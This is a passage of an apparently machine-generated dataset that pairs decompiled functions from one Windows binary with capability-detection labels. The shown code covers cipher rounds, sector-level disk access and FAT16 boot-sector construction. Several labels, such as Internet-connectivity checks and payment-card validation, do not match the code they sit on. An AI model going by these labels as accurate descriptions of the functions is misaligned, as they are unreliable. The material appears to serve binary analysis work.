uStackX8;\n                        uVar15 = uVar15 + 0x18;\n                        uVar19 = uVar19 + 8;\n                        uVar18 = uStackX32;\n                    } while (uStackX8 < uVar16);\n                }\n                uStackX32 = uVar18 + 1;\n                uVar8 = uStackX32;\n                uVar13 = uVar13 + 8;\n            } while (uStackX32 < arg1[4]);\n        }\n        *arg2 = puVar4;\n        *arg3 = *arg1 * 0x11 + 0x14 + uVar17;\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 1596
    },
    "0002c014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002c014(uint32_t *arg1, int32_t *arg2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = arg1[1] + *arg2;\n    uVar1 = arg2[1] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = ((*((uVar3 >> 8) * 4 + 0x120e0) ^ *((uVar3 & 0xff) * 4 + 0x124e0)) + *((uVar3 >> 0x10) * 4 + 0x12ce0)) -\n            *((uVar3 >> 0x18) * 4 + 76000) ^ *arg1;\n    uVar3 = arg2[2] ^ uVar4;\n    uVar1 = arg2[3] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = arg1[1] ^ (*((uVar3 >> 8) * 4 + 0x120e0) - *((uVar3 & 0xff) * 4 + 0x124e0)) + *((uVar3 >> 0x18) * 4 + 76000)\n                      ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar3 = arg2[4] - uVar2;\n    uVar1 = arg2[5] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x120e0) + *((uVar3 & 0xff) * 4 + 0x124e0) ^ *((uVar3 >> 0x18) * 4 + 76000)) -\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar3 = uVar4 + arg2[6];\n    uVar1 = arg2[7] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ ((*((uVar3 >> 8) * 4 + 0x120e0) ^ *((uVar3 & 0xff) * 4 + 0x124e0)) +\n                    *((uVar3 >> 0x10) * 4 + 0x12ce0)) - *((uVar3 >> 0x18) * 4 + 76000);\n    uVar3 = arg2[8] ^ uVar2;\n    uVar1 = arg2[9] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x120e0) - *((uVar3 & 0xff) * 4 + 0x124e0)) + *((uVar3 >> 0x18) * 4 + 76000) ^\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar3 = arg2[10] - uVar4;\n    uVar1 = arg2[0xb] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x120e0) + *((uVar3 & 0xff) * 4 + 0x124e0) ^ *((uVar3 >> 0x18) * 4 + 76000)) -\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar3 = uVar2 + arg2[0xc];\n    uVar1 = arg2[0xd] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ ((*((uVar3 >> 8) * 4 + 0x120e0) ^ *((uVar3 & 0xff) * 4 + 0x124e0)) +\n                    *((uVar3 >> 0x10) * 4 + 0x12ce0)) - *((uVar3 >> 0x18) * 4 + 76000);\n    uVar3 = arg2[0xe] ^ uVar4;\n    uVar1 = arg2[0xf] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x120e0) - *((uVar3 & 0xff) * 4 + 0x124e0)) + *((uVar3 >> 0x18) * 4 + 76000) ^\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar3 = arg2[0x10] - uVar2;\n    uVar1 = arg2[0x11] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x120e0) + *((uVar3 & 0xff) * 4 + 0x124e0) ^ *((uVar3 >> 0x18) * 4 + 76000)) -\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar3 = uVar4 + arg2[0x12];\n    uVar1 = arg2[0x13] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ ((*((uVar3 >> 8) * 4 + 0x120e0) ^ *((uVar3 & 0xff) * 4 + 0x124e0)) +\n                    *((uVar3 >> 0x10) * 4 + 0x12ce0)) - *((uVar3 >> 0x18) * 4 + 76000);\n    uVar3 = arg2[0x14] ^ uVar2;\n    uVar1 = arg2[0x15] & 0x1f;\n    uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n    uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x120e0) - *((uVar3 & 0xff) * 4 + 0x124e0)) + *((uVar3 >> 0x18) * 4 + 76000) ^\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar1 = arg2[0x17] & 0x1f;\n    uVar3 = arg2[0x16] - uVar4 << uVar1 | arg2[0x16] - uVar4 >> 0x20 - uVar1;\n    uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x120e0) + *((uVar3 & 0xff) * 4 + 0x124e0) ^ *((uVar3 >> 0x18) * 4 + 76000)) -\n                    *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    if (arg2[0x20] == 0) {\n        uVar1 = arg2[0x19] & 0x1f;\n        uVar3 = uVar2 + arg2[0x18] << uVar1 | uVar2 + arg2[0x18] >> 0x20 - uVar1;\n        uVar4 = uVar4 ^ ((*((uVar3 >> 8) * 4 + 0x120e0) ^ *((uVar3 & 0xff) * 4 + 0x124e0)) +\n                        *((uVar3 >> 0x10) * 4 + 0x12ce0)) - *((uVar3 >> 0x18) * 4 + 76000);\n        uVar3 = arg2[0x1a] ^ uVar4;\n        uVar1 = arg2[0x1b] & 0x1f;\n        uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n        uVar2 = uVar2 ^ (*((uVar3 >> 8) * 4 + 0x120e0) - *((uVar3 & 0xff) * 4 + 0x124e0)) +\n                        *((uVar3 >> 0x18) * 4 + 76000) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n        uVar3 = arg2[0x1c] - uVar2;\n        uVar1 = arg2[0x1d] & 0x1f;\n        uVar3 = uVar3 << uVar1 | uVar3 >> 0x20 - uVar1;\n        uVar4 = uVar4 ^ (*((uVar3 >> 8) * 4 + 0x120e0) + *((uVar3 & 0xff) * 4 + 0x124e0) ^\n                        *((uVar3 >> 0x18) * 4 + 76000)) - *((uVar3 >> 0x10 & 0xff) * 4 + 0x12ce0);\n        uVar1 = arg2[0x1f] & 0x1f;\n        uVar3 = uVar4 + arg2[0x1e] << uVar1 | uVar4 + arg2[0x1e] >> 0x20 - uVar1;\n        uVar2 = uVar2 ^ ((*((uVar3 >> 8) * 4 + 0x120e0) ^ *((uVar3 & 0xff) * 4 + 0x124e0)) +\n                        *((uVar3 >> 0x10) * 4 + 0x12ce0)) - *((uVar3 >> 0x18) * 4 + 76000);\n    }\n    arg1[1] = uVar4;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 2569
    },
    "0002c514": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002c514(uint32_t *arg1, int32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    \n    uVar8 = *arg1;\n    uVar6 = arg1[1];\n    if (arg2[0x20] == 0) {\n        uVar4 = arg2[0x1f] & 0x1f;\n        uVar7 = uVar6 + arg2[0x1e] << uVar4 | uVar6 + arg2[0x1e] >> 0x20 - uVar4;\n        uVar8 = uVar8 ^ ((*((uVar7 >> 8) * 4 + 0x120e0) ^ *((uVar7 & 0xff) * 4 + 0x124e0)) +\n                        *((uVar7 >> 0x10) * 4 + 0x12ce0)) - *((uVar7 >> 0x18) * 4 + 76000);\n        uVar7 = arg2[0x1c] - uVar8;\n        uVar4 = arg2[0x1d] & 0x1f;\n        uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n        uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x120e0) + *((uVar7 & 0xff) * 4 + 0x124e0) ^\n                        *((uVar7 >> 0x18) * 4 + 76000)) - *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n        uVar7 = arg2[0x1a] ^ uVar6;\n        uVar4 = arg2[0x1b] & 0x1f;\n        uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n        uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x120e0) - *((uVar7 & 0xff) * 4 + 0x124e0)) +\n                        *((uVar7 >> 0x18) * 4 + 76000) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n        uVar4 = arg2[0x19] & 0x1f;\n        uVar7 = uVar8 + arg2[0x18] << uVar4 | uVar8 + arg2[0x18] >> 0x20 - uVar4;\n        uVar6 = uVar6 ^ ((*((uVar7 >> 8) * 4 + 0x120e0) ^ *((uVar7 & 0xff) * 4 + 0x124e0)) +\n                        *((uVar7 >> 0x10) * 4 + 0x12ce0)) - *((uVar7 >> 0x18) * 4 + 76000);\n    }\n    uVar4 = arg2[0x17] & 0x1f;\n    uVar7 = arg2[0x16] - uVar6 << uVar4 | arg2[0x16] - uVar6 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x120e0) + *((uVar7 & 0xff) * 4 + 0x124e0) ^ *((uVar7 >> 0x18) * 4 + 76000)) -\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = arg2[0x14] ^ uVar8;\n    uVar4 = arg2[0x15] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x120e0) - *((uVar7 & 0xff) * 4 + 0x124e0)) + *((uVar7 >> 0x18) * 4 + 76000) ^\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = uVar6 + arg2[0x12];\n    uVar4 = arg2[0x13] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ ((*((uVar7 >> 8) * 4 + 0x120e0) ^ *((uVar7 & 0xff) * 4 + 0x124e0)) +\n                    *((uVar7 >> 0x10) * 4 + 0x12ce0)) - *((uVar7 >> 0x18) * 4 + 76000);\n    uVar7 = arg2[0x10] - uVar8;\n    uVar4 = arg2[0x11] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x120e0) + *((uVar7 & 0xff) * 4 + 0x124e0) ^ *((uVar7 >> 0x18) * 4 + 76000)) -\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = arg2[0xe] ^ uVar6;\n    uVar4 = arg2[0xf] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x120e0) - *((uVar7 & 0xff) * 4 + 0x124e0)) + *((uVar7 >> 0x18) * 4 + 76000) ^\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = uVar8 + arg2[0xc];\n    uVar4 = arg2[0xd] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ ((*((uVar7 >> 8) * 4 + 0x120e0) ^ *((uVar7 & 0xff) * 4 + 0x124e0)) +\n                    *((uVar7 >> 0x10) * 4 + 0x12ce0)) - *((uVar7 >> 0x18) * 4 + 76000);\n    uVar7 = arg2[10] - uVar6;\n    uVar4 = arg2[0xb] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x120e0) + *((uVar7 & 0xff) * 4 + 0x124e0) ^ *((uVar7 >> 0x18) * 4 + 76000)) -\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = arg2[8] ^ uVar8;\n    uVar4 = arg2[9] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x120e0) - *((uVar7 & 0xff) * 4 + 0x124e0)) + *((uVar7 >> 0x18) * 4 + 76000) ^\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = uVar6 + arg2[6];\n    uVar4 = arg2[7] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ ((*((uVar7 >> 8) * 4 + 0x120e0) ^ *((uVar7 & 0xff) * 4 + 0x124e0)) +\n                    *((uVar7 >> 0x10) * 4 + 0x12ce0)) - *((uVar7 >> 0x18) * 4 + 76000);\n    uVar7 = arg2[4] - uVar8;\n    uVar4 = arg2[5] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar6 = uVar6 ^ (*((uVar7 >> 8) * 4 + 0x120e0) + *((uVar7 & 0xff) * 4 + 0x124e0) ^ *((uVar7 >> 0x18) * 4 + 76000)) -\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = arg2[2] ^ uVar6;\n    uVar4 = arg2[3] & 0x1f;\n    uVar7 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar8 = uVar8 ^ (*((uVar7 >> 8) * 4 + 0x120e0) - *((uVar7 & 0xff) * 4 + 0x124e0)) + *((uVar7 >> 0x18) * 4 + 76000) ^\n                    *((uVar7 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    uVar7 = uVar8 + *arg2;\n    uVar4 = arg2[1] & 0x1f;\n    uVar5 = uVar7 << uVar4 | uVar7 >> 0x20 - uVar4;\n    uVar7 = *((uVar5 & 0xff) * 4 + 0x124e0);\n    uVar1 = *((uVar5 >> 8) * 4 + 0x120e0);\n    iVar2 = *((uVar5 >> 0x18) * 4 + 76000);\n    iVar3 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x12ce0);\n    arg1[1] = uVar8;\n    *arg1 = ((uVar7 ^ uVar1) - iVar2) + iVar3 ^ uVar6;\n    return;\n}\n",
        "token_count": 2638
    },
    "0002eda8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002eda8(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    ulong uVar1;\n    char *pcVar2;\n    int64_t iVar3;\n    uchar auStack184 [144];\n    \n    if (((arg3 & 0x1ff) == 0) && (arg3 <= *(arg1 * 8 + 0x7eea8) - 0x200U)) {\n        iVar3 = 0;\n        pcVar2 = arg3 + *(arg1 * 8 + 0x7ee98);\n        do {\n            if (*pcVar2 != '\\0') {\n                fcn.0002d030(auStack184, 0x10, 0x69fa8);\n                fcn.0002ca20(arg3 + *(arg1 * 8 + 0x7ee98), arg2, 0x200, auStack184);\n                goto code_r0x0002ee19;\n            }\n            iVar3 = iVar3 + 1;\n            pcVar2 = pcVar2 + 1;\n        } while (iVar3 < 0x200);\n        fcn.0006677c(arg2, 0, 0x200);\ncode_r0x0002ee19:\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 308
    },
    "0002f1b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002f1b0(void)\n\n{\n    if (*0x7ee80 != '\\0') {\n        *0x7ee80 = '\\0';\n        *0x7ee81 = 1;\n        (*_fcn.00011638)(0x7eee0, 0, 0);\n        fcn.00032748(0x7eef8, 0);\n        fcn.00032710(0x7eef8);\n        (*_fcn.00011388)(*0x7eeb8);\n        fcn.00017350(*0x7eeb8);\n        *0x7eeb8 = 0;\n        fcn.00066866(0xffffffffffffffff, *0x7ee98);\n        fcn.000666f2(*0x7ee88);\n        fcn.000666f2(*0x7ee70);\n        *0x7ee98 = 0;\n        *0x7ee88 = 0;\n        *0x7ee70 = 0;\n        (*_fcn.00011388)(*0x7eec0);\n        fcn.00017350(*0x7eec0);\n        fcn.00066866(0xffffffffffffffff, *0x7eea0);\n        fcn.000666f2(*0x7ee90);\n        *0x7eec0 = 0;\n        *0x7eea0 = 0;\n        *0x7ee90 = 0;\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "0002f2cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0002f2cc(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    char cVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int64_t iStackX8;\n    uint64_t auStackX16 [3];\n    uchar auStack72 [24];\n    \n    pcVar3 = *(arg1 + 0xb8);\n    if (*(arg1 + 0x44) != '\\0') {\n        return 0xc0000120;\n    }\n    iVar4 = *(arg1 + 8);\n    uVar5 = *(pcVar3 + 0x28) != *0x7eeb8;\n    if (iVar4 == 0) {\n        return 0xc0000001;\n    }\n    if ((*(iVar4 + 10) & 5) == 0) {\n        iStackX8 = (**0x11230)(iVar4, 0, 1, 0, 0, 0x10);\n    }\n    else {\n        iStackX8 = *(iVar4 + 0x18);\n    }\n    if (iStackX8 == 0) {\n        return 0xc000009a;\n    }\n    if (*pcVar3 == '\\x03') {\n        uVar1 = *(pcVar3 + 8);\n        uVar7 = *(pcVar3 + 0x18) >> 0x3f & 0x1ff;\n        if (((*(pcVar3 + 0x18) + uVar7 & 0x1ff) != uVar7) || ((uVar1 & 0x1ff) != 0)) {\n            return 0xc000000d;\n        }\n        uVar7 = 0;\n        if (uVar1 != 0) {\n            uVar2 = *(pcVar3 + 0x18);\n            do {\n                cVar6 = fcn.0002eda8(uVar5, uVar7 + iStackX8, uVar2 + uVar7);\n                if (cVar6 == '\\0') break;\n                uVar7 = uVar7 + 0x200;\n            } while (uVar7 < uVar1);\n        }\n        *(arg1 + 0x38) = uVar7;\n    }\n    else {\n        uVar7 = *(pcVar3 + 0x18);\n        auStackX16[0] = *(pcVar3 + 8);\n        uVar8 = uVar7 >> 0x3f & 0x1ff;\n        if ((uVar7 + uVar8 & 0x1ff) != uVar8) {\n            return 0xc000000d;\n        }\n        if ((*(pcVar3 + 8) & 0x1ff) != 0) {\n            return 0xc000000d;\n        }\n        uVar8 = 0;\n        if (auStackX16[0] != 0) {\n            do {\n                cVar6 = fcn.0002ecf0(uVar5, uVar8 + iStackX8, (uVar7 & 0xffffffff) + uVar8);\n                if (cVar6 == '\\0') break;\n                uVar8 = uVar8 + 0x200;\n            } while (uVar8 < auStackX16[0]);\n        }\n        iStackX8 = (uVar7 & 0xffffffff) + *(uVar5 * 8 + 0x7ee98);\n        fcn.00066878(0xffffffffffffffff, &iStackX8, auStackX16, auStack72);\n        *(arg1 + 0x38) = uVar8;\n    }\n    return 0;\n}\n",
        "token_count": 850
    },
    "0002f974": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0002f974(ulong arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uchar uVar2;\n    uchar *arg2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    int64_t arg1_00;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uchar auStack120 [11];\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    ulong uStack77;\n    ushort uStack69;\n    uchar uStack67;\n    ulong uStack66;\n    \n    uVar3 = in_stack_00000030;\n    arg1_00 = arg1;\n    arg2 = fcn.00030c98(uVar3);\n    uVar8 = 0;\n    if (arg2 == NULL) {\n        uVar8 = 0;\n    }\n    else {\n        fcn.0006677c(auStack120, 0, 0x3e);\n        uVar7 = arg3 * arg4 * in_stack_00000028 - 1;\n        uStack108 = in_stack_00000030 >> 8;\n        auStack120[0] = 0xeb;\n        uStack109 = in_stack_00000030;\n        uVar4 = uVar7 / 0xfff5;\n        if (uVar4 < 0x81) {\n            iVar6 = 0x40;\n            if (uVar4 < 0x41) {\n                if (uVar4 < 0x21) {\n                    iVar6 = 0x10;\n                    if (uVar4 < 0x11) {\n                        if (uVar4 < 9) {\n                            iVar6 = 4;\n                            if (uVar4 < 5) {\n                                if (uVar4 < 3) {\n                                    iVar6 = (1 < uVar4) + 1;\n                                }\n                            }\n                            else {\n                                iVar6 = 8;\n                            }\n                        }\n                    }\n                    else {\n                        iVar6 = 0x20;\n                    }\n                }\n            }\n            else {\n                iVar6 = 0x80;\n            }\n            uStack107 = iVar6;\n            uStack106 = 2;\n            uStack105 = 0;\n            uStack104 = 2;\n            uStack103 = 0;\n            uStack102 = 2;\n            uVar2 = uVar7 >> 8;\n            if (uVar7 < 0x10000) {\n                uStack101 = uVar7;\n                uStack100 = uVar2;\n            }\n            uStack99 = 0xf8;\n            uVar1 = (uVar7 - 0x4000 / uVar3) * 2 - 4;\n            uVar4 = iVar6 * in_stack_00000030 + 4;\n            uVar5 = uVar1 / uVar4;\n            if (uVar1 % uVar4 != 0) {\n                uVar5 = uVar5 + 1;\n            }\n            uStack96 = in_stack_00000028;\n            uStack97 = uVar5 >> 8;\n            uStack94 = arg3;\n            uStack98 = uVar5;\n            uStack95 = in_stack_00000028 >> 8;\n            uStack93 = arg3 >> 8;\n            uStack92 = 1;\n            uStack91 = 0;\n            uStack90 = 0;\n            uStack89 = 0;\n            if (0xffff < uVar7) {\n                uStack85 = uVar7 >> 0x18;\n                uStack86 = uVar7 >> 0x10;\n                uStack88 = uVar7;\n                uStack87 = uVar2;\n            }\n            uStack84 = 0x80;\n            uStack82 = 0x29;\n            uStack81 = 0xe8;\n            uStack80 = 0x99;\n            uStack79 = 0x9b;\n            uStack78 = 0xba;\n            uStack77 = *0x14108;\n            uStack69 = *0x14110;\n            uStack67 = *0x14112;\n            uStack66 = 0x2020203631544146;\n            fcn.0006677c(arg2, 0, uVar3);\n            fcn.0006670a(arg2, auStack120);\n            fcn.0002ecf0(arg1_00, arg2, 0);\n            fcn.0006677c(arg2, 0);\n            if (uVar5 * 2 != 0) {\n                uVar8 = uVar5 * 2;\n                uVar4 = in_stack_00000030;\n                do {\n                    uVar4 = uVar4 + in_stack_00000030;\n                    fcn.0002ecf0(arg1_00, arg2, uVar4);\n                    uVar8 = uVar8 - 1;\n                } while (uVar8 != 0);\n            }\n            *arg2 = 0xf8;\n            arg2[1] = 0xff;\n            arg2[2] = 0xff;\n            arg2[3] = 0xff;\n            fcn.0002ecf0(arg1_00, arg2, in_stack_00000030 * 2);\n            fcn.0002ecf0(arg1_00, arg2, (uVar5 + 2) * in_stack_00000030);\n            uVar8 = 1;\n        }\n        uVar3 = fcn.00030d24(arg2);\n        uVar8 = uVar3 & 0xffffffffffffff00 | uVar8;\n    }\n    return uVar8;\n}\n",
        "token_count": 1470
    },
    "0002fd5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.0002fd5c(ulong arg1, int16_t *arg2, char *arg3, uint64_t arg4)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    int64_t arg2_00;\n    uint64_t uVar8;\n    char *pcVar9;\n    ulong uVar10;\n    uint64_t arg4_00;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int32_t iVar13;\n    uint64_t uVar14;\n    \n    uVar11 = 0;\n    if (arg4 != 0) {\n        arg4_00 = arg4;\n        fcn.0006677c(arg3, 0, arg4);\n        arg2_00 = arg4 - 1;\n        if (arg1 == 2) {\n            uVar11 = *arg2;\n            uVar10 = 0x14150;\n            goto code_r0x0002fdb4;\n        }\n        if (arg1 == 0x17) {\n            uVar3 = uVar11;\n            uVar5 = uVar11;\n            piVar7 = arg2;\n            uVar8 = uVar11;\n            uVar12 = uVar11;\n            uVar14 = uVar11;\n            if ((((*arg2 == 0) && (arg2[1] == 0)) && (arg2[2] == 0)) && ((arg2[3] == 0 && (arg2[4] == 0)))) {\n                if (arg2[5] == 0) {\n                    uVar11 = *(arg2 + 6);\n                    uVar10 = 0x14140;\n                }\n                else {\n                    if (arg2[5] != -1) goto code_r0x0002fe4f;\n                    uVar11 = *(arg2 + 6);\n                    uVar10 = 0x14128;\n                }\ncode_r0x0002fdb4:\n                fcn.00044350(arg3, arg2_00, uVar10, uVar11);\n                return arg3;\n            }\ncode_r0x0002fe4f:\n            do {\n                if (*piVar7 == 0) {\n                    if (uVar8 == 0) {\n                        uVar3 = 1;\n                        uVar8 = uVar5;\n                    }\n                    else {\n                        uVar3 = uVar3 + 1;\n                    }\n                }\n                else if (((0 < uVar5) && (piVar7[-1] == 0)) && ((uVar14 == 0 || (uVar12 < uVar3)))) {\n                    uVar12 = uVar3;\n                    uVar14 = uVar8;\n                }\n                uVar4 = uVar5 + 1;\n                uVar5 = uVar4;\n                piVar7 = piVar7 + 1;\n            } while (uVar4 < 8);\n            *arg3 = '[';\n            iVar13 = uVar14;\n            uVar3 = uVar11;\n            do {\n                uVar5 = 0xffffffffffffffff;\n                pcVar9 = arg3;\n                do {\n                    if (uVar5 == 0) break;\n                    uVar5 = uVar5 - 1;\n                    cVar1 = *pcVar9;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar1 != '\\0');\n                iVar6 = ~uVar5 - 1;\n                if ((uVar11 == iVar13) && (uVar12 != 0)) {\n                    fcn.00044350(arg3 + iVar6, arg2_00 - iVar6, 0x14120, arg4_00);\n                }\n                else if ((uVar11 <= iVar13) || (uVar12 + iVar13 <= uVar3)) {\n                    if (uVar11 == 7) {\n                        uVar2 = fcn.00030df4(arg2[7]);\n                        uVar10 = 0x1411c;\n                    }\n                    else {\n                        uVar2 = fcn.00030df4(arg2[uVar11]);\n                        uVar10 = 0x14118;\n                    }\n                    arg4_00 = uVar2;\n                    fcn.00044350(arg3 + iVar6, arg2_00 - iVar6, uVar10, arg4_00);\n                }\n                uVar11 = uVar11 + 1;\n                uVar3 = uVar3 + 1;\n            } while (uVar11 < 8);\n            uVar11 = 0xffffffffffffffff;\n            pcVar9 = arg3;\n            do {\n                if (uVar11 == 0) break;\n                uVar11 = uVar11 - 1;\n                cVar1 = *pcVar9;\n                pcVar9 = pcVar9 + 1;\n            } while (cVar1 != '\\0');\n            fcn.00044350(arg3 + (~uVar11 - 1), arg2_00 - (~uVar11 - 1), 0x14114, 